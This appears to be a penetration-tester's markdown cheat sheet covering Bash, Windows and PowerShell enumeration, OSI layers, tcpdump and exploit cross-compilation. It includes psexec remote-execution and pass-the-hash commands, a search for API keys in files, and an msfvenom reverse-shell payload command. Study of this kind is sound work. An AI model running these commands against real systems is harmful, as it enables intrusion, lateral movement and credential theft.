## Linux

### Command Line Fun

- Bash Environment
	- `echo $PATH`
	- `env`
	- `history`
	- `!1`
	- `systemctl restart apache2`
	- `!!`

- Piping
	- `cat error.txt | wc -m > count.txt`

- Text Search
	- grep
		- `ls -la /usr/bin | grep zip`

	- sed
		- `echo "I need to try hard" | sed 's/hard/harder/'`

	- cut
		- `echo "I hack binaries,web apps,mobile apps, and just about anything else" | cut -f 2 -d ","`

	- awk
		- `echo "hello::there::friend" | awk -F "::" '{print $1, $3}'`

- Editing Files
	- nano
	- vi

- Comparing Files
	- `comm`
	- `diff`
	- `vimdiff`

- Managing Process
	- `ping -c 400 localhost > ping_results.txt &`
	- `jobs`
	- `fg %1`
	- `ps -ef`
	- `ps -fC leafpad`
	- `kill`

- Command Monitoring
	- `tail -f`
	- `watch –n 5 w`

- Downloading Files
	- `wget`
	- `curl`
	- `axel`

- Customizing Bash
	- `HISTCONTROL`
	- `alias`
	- `unalias`
	- `cat ~/.bashrc`

### Basic Bash Scripting

- cat
	- `cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'`
	- `cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap"`

- grep
	- `grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpon e\.com" | awk -F "http://" '{print $2}' | cut -d "/" -f 1`

- for
	- `for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done`
	- `for url in $(cat list.txt); do host $url; done`
	- `for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u`
	- `for i in {1..10}; do echo 10.11.1.$i; done`
	- `for ip in $(seq 1 10); do echo 10.11.1.$ip; done`


## Windows

### Command Prompt

- Basic Commands
	- Information Gathering
		- `arp -a`
		- `cmdkey /list`
		- `dism /online /get-features | more`
		- `ipconfig /all`
		- `ipconfig /displaydns`
		- `net accounts /domain`
		- `net group "Domain Admins" /domain`
		- `net group "Domain Controllers" /domain`
		- `net group /domain`
		- `net localgroup "Administrators"`
		- `net localgroup "Administrators" user /add`
		- `net share`
		- `netsh interface ip show interfaces`
		- `netstat –nao`
		- `nslookup IP`
  
	- Copy & execute program on remote host
		- `psexec /accepteula \\IP -c C:\Tools\program.exe -u DOMAIN\USER -p PASS`

	- Install software on remote host
		- `psexec /accepteula \\IP -i -s "msiexe.exe /i setup.msi" -c setup.msi`

	- Enable Powershell on remote host silently
		- `psexec /accepteula \\IP -s c:\Windows\System32\winrm.cmd quickconfig -quiet 2>&1> $null`

	- Run command as system on remote host
		- `psexec /accepteula \\IP -s cmd.exe`

	- Pass the hash run remote command
		- `psexec /accepteula \\IP -u DOMAIN\USER -p LM:NTLM cmd.exe /c dir c:\file.exe`

	- Execute file on remote system
		- `psexec /accepteula \\IP -u DOMAIN\USER -p PASS -c -f \\IP_2\share\file.exe`

	- Run file as specified user
		- `runas /user:USER "file.exe"`

	- SC create a remote service on host
		- `sc \\IP create SERVICE`

	- Query brief status of all services
		- `sc query`

	- Query brief status of all services on remote host 
		- `sc query \\IP`

### Powershell

- Basic Commands
	- Information Gathering
		- `Verb-noun`
		- `Get-Help COMMAND-NAME`
		- `Get-Help Get-Command -Examples`
		- `Get-Command Verb-*`
		- `Get-Command *-noun`
		- `Verb-Noun | Get-Member`
		- `Get-Command | Get-Member -MemeberType Method`
		- `Get-ChildItem | Select-Object -Property Name`
		- `Verb-Noun | Where-Object -Property PropertyName -operator Value`
		- `Get-Service | Where-Object -Property Status -eq Stopped`
		- `Get-ChildItem | Sort-Object`
		- `Get-ChildItem -Path C:\ -Include *interesting-file.txt* -File -Recurse -ErrorAction SilentlyContinue`

- Enumeration
	- Enumeration
		- `Get-Acl c:/`
		- `Get-ScheduleTask -TaskName new-sched-task`
		- `Get-Process`
		- `Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY`
		- `Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue`
		- `Get-ComputerInfo`
		- `Get-Hotfix -Id KB4023834`
		- `Get-Hotfix | measure`
		- `Get-NetTCPConnection | Where-Object -Property State -Match Listen | measure`
		- `Get-NetIPAddress`
		- `Get-LocalGroup | measure`
		- `Get-LocalUser | Where-Object -Property PasswordRequired -Match false`
		- `Get-LocalUser | Get-Member`
		- `Get-LocalUser -SID "S-1-5-21-"`

## Network

### All People Seem To Need Data Processing

- Application
	- HTTP, SMTP...
		- Accepts communication requests from applications

- Presentation
	- WMV, JPEG, MOV...
		- Transform data to give format

- Session
	- Session management
		- Tracks communication between host/receiver

- Transport
	- TCP
		- Segments

	- UDP
		- Datagrams

- Network
	- IP Address, Routing...
		- Logical addressing

- Data Link
	- Switching, Mac Address...
		- Check received packets
		- Data formatted for transmission

- Physical
	- Cables
		- Transmit/Receives data
		
## Wireshark (Example)

- Follow = TCP Stream / UDP Stream 

- Frame 1
	- This is showing details from the physical layer
	- The size of the packet received in terms of bytes

- Ethernet II
	- This is showing details from the Data Link layer 
	- The transmission medium, source and destination MAC addresses of the request.

- Internet Protocol Version 4
	- This is showing details from the Network layer
	- The source and destination IP addresses of the request.

- Transmission Control Protocol
	- This is showing details from the Transport layer
	- Protocol, etc

- Hypertext Transfer Protocol / Domain Name System / etc
	- This is showing details from the Application layer 
	- HTTP GET request

## TCPDump

- `tcpdump -r password_cracking_filtered.pcap`
- `tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3 }' | sort | uniq -c | head`
- `tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap`
- `tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap`
- `tcpdump -n port 81 -r password_cracking_filtered.pcap`
- `tcpdump -nX -r password_cracking_filtered.pcap`

## Fixing Exploits
- Cross Compiling Exploit Code
	- `apt install mingw-w64`
	- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe`
	- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
	- `msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT EXITFUNC= thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"`

- [Cross Compile to Windows from Linux](https://arrayfire.com/cross-compile-to-windows-from-linux/)
	- Compile 32-bit program on 64- bit gcc
		- `sudo apt-get install g++-multilib`
		- `sudo apt-get install gcc-multilib`
		- `gcc -m32 -Wl,--hash-style=both exploit.c -o exploit`
